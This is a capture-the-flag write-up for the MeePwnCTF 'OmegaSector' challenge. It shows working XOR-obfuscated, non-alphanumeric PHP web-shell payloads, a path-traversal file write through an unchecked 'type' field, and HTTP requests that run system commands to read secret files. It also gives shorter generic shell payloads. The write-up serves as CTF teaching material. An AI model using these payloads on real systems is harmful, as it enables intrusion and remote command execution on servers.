### OmegaSector 

very briefly describing what's going on...when u enable debugging on page (`?is_debug=1`), you see index.php receives two weird URI's and we can go through different arenas in application. the trick at first part is to pass a URI in your requests without having `/` which is quite easy using Burpsuite you can pass it: 

```
GET http://human.ludibrium.meepwn.team/?human=Yes HTTP/1.1
Host: 138.68.228.12
``` 

then you'll receive PHPSESSID from server. By replacing that and making request you'll receive `302 Found` and if you follow redirection, you'll be redirected to omega_sector.php 

we found that humans can only write alphanum characters. in order to write a shellcode we need to have non-alphanum characters as well. so let's get PHPSESSID for aliens arena same way as we did for human: 

```
GET http://alien.somewhere.meepwn.team/?alien=%40!%23$%40!%40%40 HTTP/1.1
Host: 138.68.228.12
``` 

aliens can write any non-alphanum character. also we noticed that there's not a any sanity check performed on `type` variable for POST at both alien_sector.php and omega_sector.php pages. 

Using `util.py/get_allowed()` I found the allowed characters for human and aliens which are as the following: 

```
human = "132547698ACBEDGFIHKJMLONQPSRUTWVYXZ_acbedgfihkjmlonqpsrutwvyxz" 

alien = "\x00\x83\x04\x87\x08\x8b\x0c\x8f\x10\x93\x14\x97\x18\x9b\x1c\x9f \xa3$\xa7(\xab,\xaf\xb3\xb7\xbb<\xbf@\xc3\xc7\xcb\xcf\xd3\xd7\xdb\\\xdf`\xe3\xe7\xeb\xef\xf3\xf7\xfb|\xff\x80\x03\x84\x07\x88\x0b\x8c\x0f\x90\x13\x94\x17\x98\x1b\x9c\x1f\xa0#\xa4\'\xa8+\xac/\xb0\xb4\xb8;\xbc?\xc0\xc4\xc8\xcc\xd0\xd4\xd8[\xdc_\xe0\xe4\xe8\xec\xf0\xf4\xf8{\xfc\x7f\x81\x02\x85\x06\x89\n\x8d\x0e\x91\x12\x95\x16\x99\x1a\x9d\x1e\xa1"\xa5&\xa9*\xad.\xb1\xb5\xb9:\xbd>\xc1\xc5\xc9\xcd\xd1\xd5\xd9\xdd^\xe1\xe5\xe9\xed\xf1\xf5\xf9\xfd~\x01\x82\x05\x86\t\x8a\r\x8e\x11\x92\x15\x96\x19\x9a\x1d\x9e!\xa2%\xa6)\xaa-\xae\xb2\xb6\xba=\xbe\xc2\xc6\xca\xce\xd2\xd6\xda]\xde\xe2\xe6\xea\xee\xf2\xf6\xfa}\xfe"
``` 

Now it's time to construct a PHP shell script. At first I started with this one: 

```php
<?$_='{{{{'^'$<>/';${$_}[_](${$_}[__]);?>
``` 

but there is a limitation on message field which it should not pass 40 characters. The latter one was 42 characters though. briefly, I'm constructing `_GET` string using XOR operation on printable non-alphanum characters, then I am converting string to Array and getting access to `_` key of that Array, which is similar to write `$_GET['_']`. PHP automatically converts key to string so we can avoid quotes surrounding the key. Furthermore, the parenthesis around the next variable treated as an argument passed to a function. In PHP, it's quite common to have a function as a string. It's the same way callbacks are working in the PHP environment. 

After searching a little bit I found that after PHP 5.4, they enabled short echo tag by default, regardless of the short_open_tag value in php.ini. so I changed the payload a little bit to decrease the length: 

```php
<?=$_='{{{{'^'$<>/';${$_}[_](${$_}[__]);
```

and now it's 40 characters long which passed the limitation. After sending this payload we can get shell: 

```
POST /alien_sector.php HTTP/1.1
Host: 138.68.228.12
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=f00ld8g8ckm9cqqrtddaqdgjs0
message=<?=$_="{{{{"^"$<>/";${$_}[_](${$_}[__]);&type=/../../human_message/info.php
``` 

then you can call it from here:

```
GET http://138.68.228.12/human_message/info.php?_=system&__=cat%20../secret.php HTTP/1.1
Host: 138.68.228.12
```

flag: 

```php
<?php

$salt='G0g0_M3s0sr4ng3rS_1337';

$omega_sector_flag="MeePwnCTF{__133-221-333-123-111___}";

//Don't attack further after captured our flag, or we will find you and we will kill you... oops, i mean ban you ^_^.

function mapl_die()

{
    $wrong = <<<EOF
    <body background="assets/wrong.jpg" class="cenback"></body>
    EOF;

    die($wrong);
}
?>
``` 

## shorter payloads:
here you can find shorter payloads for this challenge. (thanks to [@icchy](https://github.com/icchy) for brainstorming on shorter solutions)
> * using shell system command: 
```php
<?=$_=${"{{{{"^"$<>/"},`$_[_]`;
``` 

```
GET http://138.68.228.12/human_message/tiny.php?_=cat%20../secret.php HTTP/1.1
Host: 138.68.228.12
``` 
payload length: 31 

* which I guess could be the shortest alphanumeric general purpose shell code for PHP in the wild. 

> * not generic but customized for this challenge solution: 
```
<?=`/???/??? ../??????.??? > _`
``` 
payload length: 31 

`/???/???` is a shell trick which is almost always equal to `/bin/cat` :) 


cheerz 

@pwnslinger 
